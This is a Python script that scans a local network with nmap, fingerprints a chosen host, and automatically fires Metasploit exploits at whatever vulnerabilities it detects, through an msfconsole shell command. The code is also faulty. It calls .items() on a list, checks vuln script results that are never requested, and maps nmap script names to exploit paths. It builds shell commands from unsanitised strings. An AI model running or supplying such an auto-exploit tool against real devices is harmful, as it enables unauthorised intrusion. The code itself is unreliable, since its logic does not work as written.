import nmap
import os
import subprocess

# Function to scan local network using Nmap
def scan_network():
    scanner = nmap.PortScanner()
    scanner.scan(hosts='192.168.1.0/24', arguments='-sP')
    devices = []
    for ip, info in scanner.all_hosts().items():
        if 'mac' in info['addresses']:
            device_type = info['vendor'][info['addresses']['mac']]
        else:
            device_type = 'Unknown'
        devices.append((ip, device_type))
    return devices

# Function to scan a device for open ports and vulnerabilities using Nmap
def scan_device(ip):
    scanner = nmap.PortScanner()
    scanner.scan(hosts=ip, arguments='-sS -sV -O')
    if 'osmatch' in scanner[ip]:
        os_type = scanner[ip]['osmatch'][0]['osclass'][0]['osfamily']
    else:
        os_type = 'Unknown'
    ports = []
    vulnerabilities = []
    for port, info in scanner[ip]['tcp'].items():
        if info['state'] == 'open':
            ports.append(port)
            if 'script' in info:
                for script, result in info['script'].items():
                    if 'vuln' in script.lower() and result == 'true':
                        vulnerabilities.append(script)
    return os_type, ports, vulnerabilities

# Function to exploit a vulnerability using Metasploit
def exploit_device(ip, vulnerability):
    command = f"msfconsole -q -x 'use exploit/{vulnerability}; set RHOSTS {ip}; exploit'"
    subprocess.run(command, shell=True)

# Main function to execute the different steps
def main():
    devices = scan_network()
    print('Devices found in the network:')
    for index, device in enumerate(devices):
        print(f'{index+1}. IP: {device[0]} Type: {device[1]}')
    choice = input('Select the device to scan (enter the number): ')
    ip = devices[int(choice)-1][0]
    os_type, ports, vulnerabilities = scan_device(ip)
    print(f'The device with IP {ip} runs {os_type} and has the following open ports: {ports}')
    if vulnerabilities:
        print(f'The device has the following vulnerabilities: {vulnerabilities}')
        for vulnerability in vulnerabilities:
            exploit_device(ip, vulnerability)
            print(f'Exploited vulnerability: {vulnerability}')
    else:
        print('No vulnerabilities found.')

if __name__ == '__main__':
    main()
